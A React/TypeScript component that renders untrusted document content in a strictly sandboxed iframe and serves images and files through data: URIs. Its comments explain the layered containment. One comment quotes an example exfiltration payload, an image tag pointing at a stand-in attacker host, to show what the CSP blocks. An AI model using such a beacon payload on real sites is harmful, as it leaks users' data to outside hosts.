'use client';

import type { ReactElement } from 'react';
import type { DocumentContentInfo } from '../graphql/client';

/**
 * The only renderer document CONTENT ever gets (M12) — the `MessageText`
 * obligation, applied to the other untrusted-text surface in the product.
 *
 * ===========================================================================
 * CONTAINMENT, NOT INTERPRETATION
 * ===========================================================================
 *
 * docs/03 risk #6 is about document text being attacker-controlled: an uploaded
 * PDF, a scanned deed, a title somebody else wrote. A generated instrument is a
 * gentler case — its markup comes from a sha256-pinned template and every
 * substituted value is HTML-escaped by the service's own renderer — but the
 * rule this repo settled in M11 does not depend on how gentle the input looks.
 * There is no `dangerouslySetInnerHTML` here (a source scan over the whole app
 * enforces that, with `app/layout.tsx`'s theme script as the single declared
 * exemption), and there is no parser: this component does not read the content,
 * it hands the bytes to the browser inside a boundary.
 *
 * THE BOUNDARY IS THE CONTROL, and it is three layers deep:
 *
 * 1. `sandbox=""` — the empty value is the strictest one. No `allow-scripts`,
 *    so nothing in the document executes; no `allow-same-origin`, so it lands
 *    in an opaque origin with no access to this app's DOM, storage or cookies;
 *    no `allow-forms`, `allow-popups` or `allow-top-navigation`, so it cannot
 *    submit, open or navigate anything. A future edit that adds
 *    `allow-scripts allow-same-origin` together would undo the whole thing,
 *    which is why the value is asserted in this component's own spec.
 * 2. The page's Content-Security-Policy. A `srcdoc` frame inherits the
 *    embedding document's policy, so `img-src 'self' data:` and
 *    `connect-src 'self'` apply INSIDE the frame: an `<img
 *    src="https://attacker/?d=…">` smuggled into document text is refused by
 *    the browser, not by anything we wrote.
 * 3. The `csp` attribute below, which asks for a policy stricter still on the
 *    framed document alone. It is Chromium-only and ignored elsewhere, so it is
 *    defence in depth on top of (1) and (2) rather than the thing being relied
 *    on — stated here so nobody reads it as the control.
 *
 * WHAT THIS COSTS, stated rather than hidden: the document renders with the
 * browser's default styling, because a stylesheet cannot cross the sandbox
 * boundary without loosening it, and the frame cannot size itself to its
 * content because that needs scripting inside it. So it is a fixed-height
 * scrolling region showing exactly the bytes that are stored. That is honest —
 * what you see is the document as it exists — and it is the trade this repo
 * makes every time: the same reasoning that hand-wrote the template renderer,
 * the webhook verifier and the clamd client rather than adding a parser to an
 * untrusted-input path.
 *
 * ONLY HTML IS FRAMED. `encoding: utf8` with `mime: text/html` is what the
 * service returns for a generated instrument, and it is the ONLY content that
 * reaches an iframe here. An upload can never be `text/html` — the ingest
 * pipeline's magic-byte sniff admits pdf/png/jpeg/tiff only — but this
 * component checks anyway rather than trusting that invariant from a distance.
 */

export interface DocumentViewerProps {
  readonly content: DocumentContentInfo;
}

/**
 * The strictest sandbox: an EMPTY attribute grants no capability at all.
 * Extracted as a constant so the spec can assert the exact value rather than
 * matching a substring — `allow-scripts allow-same-origin` would also contain
 * "allow-scripts", and it is the combination that is fatal.
 */
export const VIEWER_SANDBOX = '';

/**
 * Chromium's per-frame policy attribute (layer 3 above). `default-src 'none'`
 * with inline styles permitted: enough for the document's own markup to render,
 * nothing that can reach the network.
 */
export const VIEWER_CSP = "default-src 'none'; style-src 'unsafe-inline'; img-src data:";

/**
 * Image types the browser renders from a `data:` URI. The page CSP allows
 * `img-src 'self' data:`, so this needs no relaxation — and a `data:` URI
 * cannot reach the network whatever the bytes contain.
 *
 * TIFF is deliberately absent even though the ingest pipeline accepts it: no
 * mainstream browser decodes it, so an `<img>` would render a broken icon. It
 * downloads instead.
 */
const INLINE_IMAGE_MIMES = new Set(['image/png', 'image/jpeg']);

/** File extension for a saved copy. Never derived from user-supplied text. */
const DOWNLOAD_EXTENSIONS: Record<string, string> = {
  'application/pdf': 'pdf',
  'image/tiff': 'tiff',
  'image/png': 'png',
  'image/jpeg': 'jpg',
};

export function DocumentViewer({ content }: DocumentViewerProps): ReactElement {
  /*
   * WHAT IS PRESENTED, AND WHAT IS NOT. docs/03 §6e (PR1) said presenting
   * uploaded binaries was "PR2's problem and gets its own decision"; this is
   * that decision, and the M12 review is why it is here rather than deferred
   * again. Leaving Read unconditioned while refusing to show the result meant
   * an uploaded document was decrypted — an audited KMS operation on the
   * owner's own trail — and then thrown away.
   *
   * Images render INLINE from a `data:` URI. The bytes reach the browser's
   * image decoder, which is the same exposure any image on any page carries,
   * and `data:` cannot reach the network. The mime is the SERVICE's sniffed
   * value, not the uploader's claim, and it is checked against a closed set
   * before it is interpolated — so no attacker-chosen string ever becomes the
   * type of a URI this page constructs.
   *
   * PDFs (and TIFFs) DOWNLOAD rather than render. A framed PDF is the
   * browser's PDF engine — a large parser — invoked on attacker-supplied bytes
   * inside our origin's frame tree; a download hands the file to whatever the
   * user already trusts to open it, which is their decision and not ours to
   * make silently. The filename is generated from ids, never from the
   * user-supplied title.
   */
  if (content.encoding === 'base64' && INLINE_IMAGE_MIMES.has(content.mime)) {
    return (
      <div>
        {/*
          A plain <img>, deliberately, not next/image: the optimizer would want
          a loader and a remote pattern for a `data:` URI whose whole point is
          that it never leaves the browser.
        */}
        <img
          className="max-h-[32rem] w-full rounded-[var(--radius-card)] border border-line bg-white object-contain"
          src={`data:${content.mime};base64,${content.content}`}
          alt={`Scanned document, version ${content.version}`}
        />
        <p className="mt-2 text-xs text-ink-muted">
          Shown exactly as stored. The image never leaves your browser.
        </p>
        <DownloadLink content={content} />
      </div>
    );
  }

  if (content.encoding === 'base64') {
    return (
      <div className="rounded-[var(--radius-card)] border border-line p-4">
        <p className="text-sm font-medium">This version is a file rather than a page</p>
        <p className="mt-1 max-w-prose text-[0.8125rem] text-ink-muted">
          It was stored as {content.mime}. We don’t open it here — saving it and using whatever you
          already trust to read it keeps this page out of the way.
        </p>
        <DownloadLink content={content} />
      </div>
    );
  }

  if (content.mime !== 'text/html') {
    // utf8 that is not our canonical HTML. Unreachable today (the ingest sniff
    // admits pdf/png/jpeg/tiff only, and generation always writes text/html),
    // and checked rather than trusted from a distance.
    return (
      <div className="rounded-[var(--radius-card)] border border-line p-4" role="status">
        <p className="text-sm font-medium">This version can’t be shown here</p>
        <p className="mt-1 text-[0.8125rem] text-ink-muted">It was stored as {content.mime}.</p>
      </div>
    );
  }

  return (
    <div>
      <iframe
        title={`Document version ${content.version}`}
        // See the header: text nodes are not an option for a document, so the
        // containment is the frame. Neither of these attributes is decorative.
        sandbox={VIEWER_SANDBOX}
        csp={VIEWER_CSP}
        srcDoc={content.content}
        className="h-[32rem] w-full rounded-[var(--radius-card)] border border-line bg-white"
      />
      <p className="mt-2 text-xs text-ink-muted">
        Shown exactly as stored, in an isolated frame with scripts and network access switched off.
      </p>
    </div>
  );
}

/**
 * Saves the decrypted bytes as a file.
 *
 * The href is a `data:` URI rather than a `blob:` one so there is no object URL
 * to leak or forget to revoke, and `download` means the browser saves rather
 * than navigates — nothing in this origin renders the bytes. The FILENAME is
 * built from ids and a mime-keyed extension, never from `documents.title`:
 * titles are user-authored, and a filename is a place where user text ends up
 * in a shell, a sync client, or a mail attachment header.
 */
function DownloadLink({ content }: { content: DocumentContentInfo }): ReactElement | null {
  const extension = DOWNLOAD_EXTENSIONS[content.mime];
  if (extension === undefined || content.encoding !== 'base64') {
    return null;
  }
  return (
    <a
      className="btn btn-secondary mt-3"
      href={`data:${content.mime};base64,${content.content}`}
      download={`document-${content.documentId}-v${content.version}.${extension}`}
    >
      Save a copy
    </a>
  );
}
